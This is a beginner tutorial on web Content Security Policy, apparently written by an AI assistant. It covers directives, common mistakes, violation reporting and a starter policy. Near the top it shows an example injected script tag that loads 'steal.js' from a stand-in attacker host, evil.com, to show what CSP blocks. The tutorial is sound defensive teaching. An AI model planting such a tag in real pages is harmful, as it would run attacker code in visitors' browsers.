## 🛡️ What is Content Security Policy (CSP)?

**CSP** is a **browser feature** that lets a website tell the browser:

> “Here’s a whitelist of sources I trust for loading scripts, styles, images, etc. Don’t allow anything else — even if it’s injected.”

---

### 🚫 Without CSP

If a hacker injects this code into your page:

```html
<script src="http://evil.com/steal.js"></script>
```

The browser loads it and runs it. 😱

---

### ✅ With CSP

The browser checks:

> “Is `evil.com` on the trusted list?”
> If not → ❌ **Blocked** before it ever runs!

---

## 📄 Basic Example

You can include CSP via a **response header** or `<meta>` tag.

### Example via HTTP header:

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com
```

This says:

* Only load everything (`default-src`) from **your own domain** (`'self'`)
* Only load scripts from **your domain** and **trusted-cdn.com**

---

## 🔍 Let’s Break It Down

### ✅ CSP Directives (You’ll See These Often)

| Directive     | What it controls               | Example                     |
| ------------- | ------------------------------ | --------------------------- |
| `default-src` | Fallback for all content types | `'self'`                    |
| `script-src`  | JavaScript sources             | `'self'`, `'unsafe-inline'` |
| `style-src`   | CSS sources                    | `'self'`, `'unsafe-inline'` |
| `img-src`     | Image sources                  | `https://images.com`        |
| `font-src`    | Font sources                   | `'self'`                    |
| `connect-src` | AJAX, WebSocket, API endpoints | `https://api.example.com`   |
| `frame-src`   | Frames or iframes              | `https://youtube.com`       |

---

## 🧬 Real-Life Analogy

> CSP is like a bouncer at a nightclub.
> Only the people on the **guest list (trusted domains)** get in. Everyone else — **denied** at the door.

---

## 🔐 CSP in Action

### Example HTML with inline policy:

```html
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self'; script-src 'self' https://cdn.jsdelivr.net">
```

### 🔥 What this does:

* Loads everything only from your own domain
* Allows scripts from `cdn.jsdelivr.net`
* Blocks scripts injected from third parties

---

## 🧨 Common Mistakes That Break CSP

| Mistake                      | Why it's dangerous             | Safer Alternative           |
| ---------------------------- | ------------------------------ | --------------------------- |
| Using `'unsafe-inline'`      | Allows inline `<script>` tags  | Move JS to external files   |
| Using `'unsafe-eval'`        | Allows `eval()` which is risky | Avoid eval, use strict code |
| Forgetting to whitelist CDNs | Breaks CSS/JS functionality    | Add trusted CDNs to policy  |

---

## 🧪 Test It Live!

You can play with CSP using these tools:

* 🔬 [https://csp-evaluator.withgoogle.com](https://csp-evaluator.withgoogle.com) – Google’s CSP scanner
* 🧰 [https://report-uri.com/home/generate](https://report-uri.com/home/generate) – CSP generator

---

## 🚨 Bonus: CSP Reporting

You can **receive reports** of blocked resources!

```http
Content-Security-Policy: default-src 'self'; report-uri /csp-violation-report-endpoint
```

The browser will **send a JSON report** to that endpoint if something is blocked.

---

## ✅ TL;DR – What CSP Does for You

| 🛡️ Benefit                | ✅ Why it matters                         |
| -------------------------- | ---------------------------------------- |
| Stops XSS                  | Prevents unauthorized script execution   |
| Prevents data leaks        | Blocks malicious AJAX/WebSocket requests |
| Controls 3rd-party content | Only loads from trusted sources          |
| Adds layers of defense     | Even if XSS gets injected, CSP blocks it |

---

## ✅ Recommended Starter CSP

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data:;
  object-src 'none';
  base-uri 'self';
```

---

Would you like:

* 🔧 Help setting up CSP on your project?

* 👁️‍🗨️ Visual flow of CSP in a browser?

* 🎮 A CSP challenge playground?